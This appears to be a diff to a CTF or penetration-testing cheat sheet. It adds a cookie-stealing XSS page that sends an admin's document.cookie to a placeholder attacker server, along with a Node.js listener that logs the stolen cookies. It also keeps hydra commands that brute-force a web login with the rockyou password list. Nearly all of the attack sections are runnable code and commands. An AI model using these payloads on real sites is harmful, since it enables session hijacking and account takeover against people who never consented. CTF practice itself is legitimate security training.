@@ -64,12 +64,55 @@ if ($socket) {
 ?>
 ```
 
-## Login brute-force with `hydra`:
-### Syntax 1
+## XSS/CSRF attack
+### Serve:
+```bash
+mkdir xss
+cd xss
+nano index.html
+sudo python3 -m http.server 4444
+```
+### index.html:
+```bash
+<html>
+  <head>
+    <title>CTF</title>
+    <script>
+      // This script will send the admin's cookies to your server when executed
+      var i = new Image();
+      i.src = "http://YOUR_SERVER_IP:5555/?cookie=" + document.cookie;
+    </script>
+  </head>
+  <body>
+    <h1>Hi Admin!</h1>
+  </body>
+</html>
+```
+### Listen:
+```bash
+mkdir cookies
+cd cookies
+nano index.js
+node index.js
+```
+### index.js:
+```bash
+const http = require('http');
+const url = require('url');
+
+http.createServer((req, res) => {
+  const queryObject = url.parse(req.url, true).query;
+  console.log('Cookies: ', queryObject.cookie);
+  res.end('Logged');
+}).listen(5555);
+```
+
+## Login brute-force with `hydra`
+### Syntax 1:
 ```bash
 sudo hydra -v -V -d -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt http-post-form://example.com/login"&username=^USER^&password=^PASS^:F=Bad"
 ```
-### Syntax 2
+### Syntax 2:
 ```bash
 sudo hydra -v -V -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt example.com http-post-form "/login:username=^USER^&password=^PASS^=:F=Bad"
 ```
